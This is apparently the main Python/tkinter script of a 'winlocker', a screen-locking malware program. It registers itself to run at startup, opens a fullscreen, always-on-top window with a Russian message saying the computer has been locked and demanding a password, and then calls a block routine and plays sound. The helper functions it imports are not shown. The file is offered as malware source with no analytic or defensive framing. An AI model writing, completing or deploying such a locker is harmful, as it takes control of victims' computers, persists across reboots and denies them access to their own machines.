from tkinter import ttk, Label, Button

import os
import os.path

from modules.variables import window, txt
from modules.config import PROGRAM_NAME, FONT, FONT_COLOR, WARNING_FONT_COLOR, BACKGROUND
from modules.utils import play, add_to_startup, block, clicked

# Путь к текущей папке
ROOT_DIR = os.path.dirname(os.path.abspath(__file__))

# Параметры окна
window.title(PROGRAM_NAME)  
window.geometry('400x250')
window['bg'] = BACKGROUND

# Размер окна
normal_width = 1920
normal_height = 1080

screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

percent_width = screen_width / (normal_width / 100)
percent_height = screen_height / (normal_height / 100)

scale_factor = ((percent_width + percent_height) / 2) / 100

# Размер шрифта
font_size = int(20 * scale_factor)
minimum_size = 10

if font_size < minimum_size:
    font_size = minimum_size

head_font_size = int(72 * scale_factor)
minimum_size = 40

if head_font_size < minimum_size:
    head_font_size = minimum_size

# Create a style and configure for ttk.Button widget
default_style = ttk.Style()
default_style.configure('New.TButton', font=(FONT, font_size))

add_to_startup()
window.attributes('-fullscreen', True, '-topmost', True)

text_1 = Label(window, text=PROGRAM_NAME, font=(FONT, head_font_size), fg=WARNING_FONT_COLOR, bg=BACKGROUND)
text_2 = Label(window, text='Внимание!', font=(FONT, head_font_size), fg=WARNING_FONT_COLOR, bg=BACKGROUND)
text_3 = Label(window, text='Ваш компьютер был заблокирован винлокером. Пожалуйста, введите пароль для получения доступа к компьютеру!', font=(FONT, font_size), fg=FONT_COLOR, bg=BACKGROUND)


text_1.grid(column=0, row=0)
text_2.grid(column=0, row=0)
text_3.grid(column=0, row=0)

text_1.place(relx = .01, rely = .01)
text_2.place(relx = .01, rely = .11)
text_3.place(relx = .01, rely = .21)
  
btn = Button(window, text="Ввести пароль", command=clicked)  
txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)

block()

play()

window.mainloop()